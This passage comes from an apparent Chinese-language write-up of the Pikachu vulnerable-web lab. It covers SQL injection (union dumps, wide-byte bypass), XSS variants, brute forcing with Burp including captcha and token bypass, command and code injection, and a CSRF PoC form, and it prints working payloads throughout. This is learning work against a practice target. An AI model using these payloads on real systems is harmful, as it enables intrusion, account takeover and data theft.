zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://www.pikachu.com/vul/sqli/sqli_header/sqli_header_login.php</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 34</span><br><span class=\"line\">Origin: http://www.pikachu.com</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=1h9tm55rqj71244okk7do3ch0q</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">username=a&amp;password=a&amp;submit=Login</span><br></pre></td></tr></table></figure>\n<p>删掉一个加单引号，没报错，用网上的 payload 也不报错，神了个奇：</p>\n<p><img src=\"pikachu-sql-005.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"盲注base-on-boolean\"><a class=\"markdownIt-Anchor\" href=\"#盲注base-on-boolean\">#</a> 盲注 (base  on boolean)</h2>\n<p><strong>过程</strong></p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class=\"line\">?name=lili&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>正常输出：</p>\n<p><img src=\"pikachu-sql-006.png\" alt=\"\"></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class=\"line\">?name=lili&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">您输入的username不存在，请重新输入！</span><br></pre></td></tr></table></figure>\n<p>可能是因为只能输出一个对象，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>爆出数据库，确定是一个对象，两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:pikachuyour email is: 1</span><br></pre></td></tr></table></figure>\n<p>爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), group_concat(table_name)  from information_schema.tables where table_schema = &#x27;pikachu&#x27; and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>uid:pikachu</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your email is: httpinfo,member,message,users,xssblind</span><br></pre></td></tr></table></figure>\n<p>爆出字段：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span><br></pre></td></tr></table></figure>\n<p>可以通过 group_concat () 分别输出每个字段所有的值，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=lilijmknh&#x27; union select database(),group_concat(id) from httpinfo where &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:pikachuyour email is: 42,43,44,45,46,47</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"盲注base-on-time未成功实现-500\"><a class=\"markdownIt-Anchor\" href=\"#盲注base-on-time未成功实现-500\">#</a> 盲注 (base on time)，未成功实现 ，500</h2>\n<p>这个就是利用二分法查 ascii 码值，手工注入的话很费时间的把</p>\n<p>靠，他根本就不关心我是谁！我要去看源码了！</p>\n<p>发现果然是盲注，不管是不是查到，都是输出 i don’t care who you are!</p>\n<p><strong>过程</strong></p>\n<p>payload，报 500 了:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_t.php?name=&#x27; or (length(database())&gt;1 and sleep(10)) and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h2>\n<p><a href=\"https://www.cnblogs.com/Rain99-/p/10583406.html\">详解</a></p>\n<ol>\n<li>字符、字符集<br>\n字符 (character) 是组成字符集 (character set) 的基本单位。对字符赋予一个数值 (encoding) 来确定这个字符在该字符集中的位置。</li>\n<li>UTF8<br>\n 由于 ASCII 表示的字符只有 128 个，因此网络世界的规范是使用 UNICODE 编码，但是用 ASCII 表示的字符使用 UNICODE 并不高效。因此出现了中间格式字符集，被称为通用转换格式，及 UTF (Universal Transformation Format)。</li>\n<li>宽字节<br>\n GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符 (一字节) 的现象，即将两个 ascii 字符误认为是一个宽字节字符。</li>\n</ol>\n<p>宽字节注入原理：</p>\n<blockquote>\n<p>GBK 占用两字节</p>\n<p>ASCII 占用一字节</p>\n<p>PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为 “\\”），MYSQL 默认字符集是 GBK 等宽字节字符集。</p>\n<p>大家都知道 % df’ 被 PHP 转义（开启 GPC、用 addslashes 函数，或者 icov 等），单引号被加上反斜杠 \\，变成了 % df\\’，其中 \\ 的十六进制是 %5C ，那么现在  <code>%df\\’</code>  = <code>%df%5c%27</code> ，如果程序的默认字符集是 GBK 等宽字节字符集，则 MySQL 用 GBK 的编码时，会认为  <code>%df%5c</code>  是一个宽字符，也就是 <code>縗</code> ，也就是说：% df\\’ = % df%5c%27 = 縗’，有了单引号就好注入了。</p>\n</blockquote>\n<p><img src=\"https://img2018.cnblogs.com/blog/1335588/201903/1335588-20190323124156168-514841357.png\" alt=\"img\"></p>\n<p><strong>过程</strong></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name=%df&#x27; or 1=1 %23+&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>\n<p>所有数据输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:1your email is: eyour uid:2your email is: allen@pikachu.comyour uid:3your email is: kobe@pikachu.comyour uid:4your email is: grady@pikachu.comyour uid:5your email is: kevin@pikachu.comyour uid:6your email is: lucy@pikachu.com......</span><br></pre></td></tr></table></figure>\n<hr>\n<h1 id=\"xss\"><a class=\"markdownIt-Anchor\" href=\"#xss\">#</a> XSS</h1>\n<blockquote>\n<p>XSS 漏洞可以用来进行钓鱼攻击，前端 JS 挖矿，用户 cookie 获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制。</p>\n</blockquote>\n<h2 id=\"反射型xssget\"><a class=\"markdownIt-Anchor\" href=\"#反射型xssget\">#</a> 反射型 xss (get)</h2>\n<h3 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h3>\n<p>​\t文本框下方会回显输入的内容，想输万能弹窗 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> ，发现文本框限制了字数，前端直接定位改成 100，成功</p>\n<p><img src=\"pikachu-xss-001.png\" alt=\"\"></p>\n<p>因为为 get 请求，所以输入的参数值会出现在 url 末尾</p>\n<hr>\n<h2 id=\"反射型xsspost大失败\"><a class=\"markdownIt-Anchor\" href=\"#反射型xsspost大失败\">#</a> 反射型 xss (post)（大失败）</h2>\n<p><img src=\"pikachu-xss-002.png\" alt=\"\"></p>\n<p>​\tPOST 请求区别与 GET 请求，POST 请求不能从 URL 让用户向服务器提交数据。所以为了进行注入，需要让用户代替攻击者提交 POST 请求，这就需要攻击者自己搭建站点，然后再站点内写一个 POST 表单，将我们搭建出的连接发给用户，这样就能让用户帮攻击者提交 POST 请求发给存在 XSS 漏洞的中。这样就能窃取到用户的 cookie，就能伪造用户登陆达到破坏的目的。</p>\n<h3 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h3>\n<p>但是这后台我没登进去呀～</p>\n<hr>\n<h2 id=\"存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#存储型xss\">#</a> 存储型 xss</h2>\n<h3 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h3>\n<p>​\t直接搞个超链接，留言列表点击跳转</p>\n<p><img src=\"pikachu-xss-003.png\" alt=\"\"></p>\n<script>alert(1)</script> 的话，每次刷新页面都会弹窗\n<hr>\n<h2 id=\"dom型\"><a class=\"markdownIt-Anchor\" href=\"#dom型\">#</a> dom 型</h2>\n<p>click 一下，发现超链接的跳转是输入的字符串，所以直接闭合就可</p>\n<h3 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h3>\n<p><img src=\"pikachu-xss-004.png\" alt=\"\"></p>\n<p>尝试用双引号闭合的时候，尽然没有作用？？？</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a&quot;&gt;nhhh<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#</span></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"pikachu-xss-005.png\" alt=\"\"></p>\n<p>全部改成单引号 <code>a'&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code> ：</p>\n<p><img src=\"pikachu-xss-006.png\" alt=\"\"></p>\n<p>但是 js 脚本没有生效，因为没有返回给服务器，所以刷新之后更改的也没有了，可以通过 onclick 弹窗:</p>\n<p><code>a' onclick=&quot;alert(1)&quot;&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code></p>\n<p><img src=\"pikachu-xss-007.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"dom型xss-x\"><a class=\"markdownIt-Anchor\" href=\"#dom型xss-x\">#</a> dom 型 xss-x</h2>\n<h3 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h3>\n<p>随便输入 a 后点按钮，出现一个超链接，发现这个超链接有一个事件，调用了 domxss () 函数，Ctrl+F 找一下 domxss 看 js 源代码，竟然还有这种明示</p>\n<p><img src=\"pikachu-xss-008.png\" alt=\"\"></p>\n<p>直接输入：’ onclick=“alert (‘xss’)”&gt;</p>\n<p><img src=\"pikachu-xss-009.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xss之盲打\"><a class=\"markdownIt-Anchor\" href=\"#xss之盲打\">#</a> xss 之盲打</h2>\n<h3 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h3>\n<p>根据提示登录后台，发现有我们提交的数据（这里只能显示一个我们交的数据！气人），所以前台提交</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>后台就会被弹</p>\n<p>可以利用这个获取 cookie，但是我还是没有试</p>\n<p>(爱鸭，怎么能不试试呢～)</p>\n<hr>\n<h2 id=\"xss之过滤\"><a class=\"markdownIt-Anchor\" href=\"#xss之过滤\">#</a> xss 之过滤</h2>\n<h3 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h3>\n<p>经过多次尝试，应是过滤了 &lt; script 和前面所有字符，大小写可以绕过，也可以用<a onclick=\"alert(1)\"></a></p>\n<hr>\n<h2 id=\"xss之htmlspecialcahrs我总是以为自己没绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss之htmlspecialcahrs我总是以为自己没绕过\">#</a> xss 之 htmlspecialcahrs，我总是以为自己没绕过</h2>\n<h3 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h3>\n<p>默认不过滤单引号</p>\n<p>payload：</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"xss之href输出\"><a class=\"markdownIt-Anchor\" href=\"#xss之href输出\">#</a> xss 之 href 输出</h2>\n<h3 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h3>\n<p>payload:</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javascript:alert(1)</span><br></pre></td></tr></table></figure>\n<p><img src=\"pikachu-xss-011.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xss之js输出\"><a class=\"markdownIt-Anchor\" href=\"#xss之js输出\">#</a> xss 之 js 输出</h2>\n<h3 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h3>\n<p>看表单发现 js 有个判断，输入 tmac 会输出一张图片，直接插入 onclick=“alert (1)”</p>\n<p><img src=\"pikachu-xss-012.png\" alt=\"\"></p>\n<p><img src=\"pikachu-xss-010.png\" alt=\"\"></p>\n<p>据说可以闭合，成功弹窗</p>\n<p>payload：</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>闭合后的 js：</p>\n<p><img src=\"pikachu-xss-013.png\" alt=\"\"></p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p><a href=\"https://blog.csdn.net/weixin_43899561/article/details/89429726\">大佬写的关于 xss 抓 cookie</a></p>\n<p><a href=\"https://www.fujieace.com/penetration-test/xss-100.html\">XSS 过滤绕过方法</a></p>\n<p><a href=\"https://www.cnblogs.com/heiwa-0924/p/12520547.html\">通关手册，写得挺好</a></p>\n<hr>\n<h1 id=\"文件包含\"><a class=\"markdownIt-Anchor\" href=\"#文件包含\">#</a> 文件包含</h1>\n<p>文件包含之看不懂自己在写什么，所以无法上传系列</p>\n<p>看样子应该就是基础的文件包含鸭～</p>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结：</h2>\n<p>文件包含：</p>\n<blockquote>\n<p>文件包含在 php 中，涉及到的危险函数有四个，分别是 include ()、include_once ()、require ()、require_once ()。</p>\n</blockquote>\n<p>区别如下：</p>\n<blockquote>\n<p>include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</p>\n<p>include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</p>\n<p>require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</p>\n<p>require_once：和 require 类似，不同处在于 require_once 只导入一次。</p>\n</blockquote>\n<hr>\n<h1 id=\"暴力破解\"><a class=\"markdownIt-Anchor\" href=\"#暴力破解\">#</a> 暴力破解</h1>\n<h2 id=\"基于表单的爆破\"><a class=\"markdownIt-Anchor\" href=\"#基于表单的爆破\">#</a> 基于表单的爆破</h2>\n<h3 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h3>\n<p>​\tbp 抓包，intrude 直接爆密码，用户名 admin。</p>\n<p>​\t根据提示，发现有三个账号：</p>\n<ul>\n<li>admin</li>\n<li>pikachu</li>\n<li>test</li>\n</ul>\n<p>前两个应该直接猜到的，最后一个还没见过，不过涨姿势了，应该都是常用账户名。</p>\n<p>想了想，用 bp 同时爆破用户名和密码（就是速度太慢了）：</p>\n<p><img src=\"pikachu-baopo-003.png\" alt=\"pikachu-baopo-003\"></p>\n<p>pitchfork 也可以啊</p>\n<p><img src=\"pikachu-baopo-001.png\" alt=\"pikachu-baopo-001\"></p>\n<p>这是给第二个参数设置字典，你这个猪<img src=\"pikachu-baopo-002.png\" alt=\"pikachu-baopo-002\"></p>\n<h2 id=\"验证码绕过on-server\"><a class=\"markdownIt-Anchor\" href=\"#验证码绕过on-server\">#</a> 验证码绕过（on server）</h2>\n<h3 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h3>\n<p>看抓的包，发现把用户输入的验证码和用户名密码一起发到服务器了，而且在 cookie 里发现了验证码的值，所以判断是验证码绕过。</p>\n<p><img src=\"pikachu-baopo-004.png\" alt=\"\"></p>\n<p>基本过程：客户端发起请求 -&gt; 服务端响应并创建一个新的 SessionID 同时生成随机验证码，将验证码和 SessionID 一并返回给客户端 -&gt; 客户端提交验证码连同 SessionID 给服务端 -&gt; 服务端验证验证码同时销毁当前会话，返回给客户端结果。</p>\n<p>所以用 bp 拦截，不让页面刷新，就不会销毁会话，也不会更新验证码，就可以用 bp 爆破辣，在 cookie 中带固定的 sessionID 和固定的验证码字符串</p>\n<p><img src=\"pikachu-baopo-005.png\" alt=\"\"></p>\n<h2 id=\"验证码绕过on-client\"><a class=\"markdownIt-Anchor\" href=\"#验证码绕过on-client\">#</a> 验证码绕过（on client）</h2>\n<h3 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h3>\n<p>在前台找到了验证验证码的函数</p>\n<p><img src=\"pikachu-baopo-006.png\" alt=\"\"></p>\n<p>通过搜索函数名，定位执行函数的位置，把这个事件删掉，bp 抓包，发现有 vcode 参数，删掉删掉，直接爆破</p>\n<p>写完 token 发现也可自动化获取前端信息，进行爆破</p>\n<h2 id=\"token防爆\"><a class=\"markdownIt-Anchor\" href=\"#token防爆\">#</a> token 防爆</h2>\n<h3 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h3>\n<p>token 主要用来防御 csrf，而无法防止暴力破解。</p>\n<p>这是因为将一个随机产生的 token 加入请求之后，每次请求 token 都会改变。</p>\n<p>csrf 攻击者只能窃取受害者的 cookie 却不能伪造当次请求的 token，token 无法防止暴力破解的原因是 token 每次都会随页面返回到前端，攻击者只要想办法__自动化获得前端的 token__即可进行暴力破解攻击。</p>\n<p>option 中的 Grep -Extract: 这个设置能够被用来通过请求返回的信息来获取有用的信息供你使用。也就是说，可以通过它来获得每次请求后返回的 token，关联到 payload 中进行暴力破解。</p>\n<p><img src=\"pikachu-baopo-007.png\" alt=\"\"></p>\n<p>这样就设置完毕了，需要注意的是 burp 的 Pichfork 爆破模式只能进行单线程的爆破，设置一下线程 1</p>\n<p><img src=\"pikachu-baopo-008.png\" alt=\"\"></p>\n<p><img src=\"pikachu-baopo-009.png\" alt=\"\"></p>\n<p><img src=\"pikachu-baopo-010.png\" alt=\"\"></p>\n<p>然后常规爆破就好了</p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p><strong>BurpSuite intruder attack-type 4 种爆破模式：</strong></p>\n<p>Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变</p>\n<p>Battering ram 多参数同时爆破，但用的是同一个字典</p>\n<p>Pichfork 多参数同时爆破，但用的是不同的字典</p>\n<p>Cluster bamb 多参数做笛卡尔乘积模式爆破</p>\n<p><a href=\"https://www.cnblogs.com/kllay/p/7136022.html\">bp 爆破各种类型解说</a></p>\n<p><a href=\"https://www.cnblogs.com/rnss/p/11233006.html\">token 看的这位大佬</a></p>\n<hr>\n<h1 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h1>\n<p><strong>漏洞概述</strong></p>\n<blockquote>\n<p>RCE（remote command/code execute）漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>\n<p>(搬一下皮卡丘哒，对这个不是很熟悉)</p>\n</blockquote>\n<p><strong>远程系统命令执行</strong></p>\n<blockquote>\n<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>\n比如我们常见的路由器、防火墙、入侵检测等设备的 web 管理界面上</p>\n<p>一般会给用户提供一个 ping 操作的 web 界面，用户从 web 界面输入目标 IP，提交后，后台会对该 IP 地址进行一次 ping 测试，并返回测试结果。而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交 “意想不到” 的命令，从而让后台进行执行，从而控制整个后台服务器</p>\n<p>现在很多的甲方企业都开始实施自动化运维，大量的系统操作会通过 &quot;自动化运维平台&quot; 进行操作。在这种平台上往往会出现远程系统命令执行的漏洞，不信的话现在就可以找你们运维部的系统测试一下，会有意想不到的 &quot;收获&quot;-_-</p>\n</blockquote>\n<p><strong>远程代码执行</strong></p>\n<blockquote>\n<p>同样的道理，因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。</p>\n<p>因此，如果需要给前端用户提供操作类的 API 接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>\n<p>你可以通过 “RCE” 对应的测试栏目，来进一步的了解该漏洞。</p>\n</blockquote>\n<h2 id=\"exec-ping\"><a class=\"markdownIt-Anchor\" href=\"#exec-ping\">#</a> exec “ping”</h2>\n<h3 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h3>\n<p>post 方法，用火狐拦截重发，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipaddress=jsdlvfdsfger | C:\\Windows\\System32\\calc.exe&amp;submit=ping</span><br></pre></td></tr></table></figure>\n<p>成功弹出</p>\n<h2 id=\"execeval\"><a class=\"markdownIt-Anchor\" href=\"#execeval\">#</a> exec&quot;eval&quot;</h2>\n<h3 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h3>\n<p>随便输一串字符串 phpinfo ()，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Parse error: syntax error, unexpected end of file in D:\\phpstudy_pro\\WWW\\pikachu\\vul\\rce\\rce_eval.php(19) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure>\n<p>后来百度发现：</p>\n<blockquote>\n<p>php 的 eval 函数是用来把一段文字当作一段 php 的脚本来执行，这样做的好处是我们可以动态修改 php 执行的内容。</p>\n<p>今天想实现的功能是：根据从浏览器 get 到的数据，使用 eval () 执行不同的函数：<br>\nif(isset(_GET['step'])){\neval(_GET[‘step’]);<br>\n}else{<br>\ncontent='\\<a href=\"?step=getipall\">第一步：获取所有的ip地址\\</a>';\nmsg(content);<br>\n}</p>\n</blockquote>\n<p>注意，这个代码是有安全问题的，千万不要在生产环境中使用。</p>\n<p>运行以上代码，提示 “eval ()’d code on line 1”，根据提示来看是 eval 函数在执行的时候出错了。</p>\n<p>第一反应就是 google，结果得到的都是其他成品程序出现了这个错误。这时候还得去翻 php 手册，根据手册的描述：eval 所执行的字符串，也得必须满足 php 的语法要求，很明显我的字符串里面缺少了括号和最后的分号。</p>\n<p>所以满足语法规则，payload 更改为 phpinfo (); 即可</p>\n<p>这真的是白给</p>\n<hr>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>(1)  ;</p>\n<p>分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。</p>\n<p>(2) ||</p>\n<p>逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。</p>\n<p>(3) &amp;&amp;</p>\n<p>逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</p>\n<p>(4) |</p>\n<p>管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。</p>\n<p>例 ls | grep *.txt</p>\n<hr>\n<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<h2 id=\"csrfget\"><a class=\"markdownIt-Anchor\" href=\"#csrfget\">#</a> csrf(get)</h2>\n<h3 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h3>\n<p>poc 在 bp 上抓 request 包，自动生成：</p>\n<p><img src=\"pikachu-csrf-001.png\" alt=\"\"></p>\n<p>poc，在里面修改你要改的值:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hehe&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span 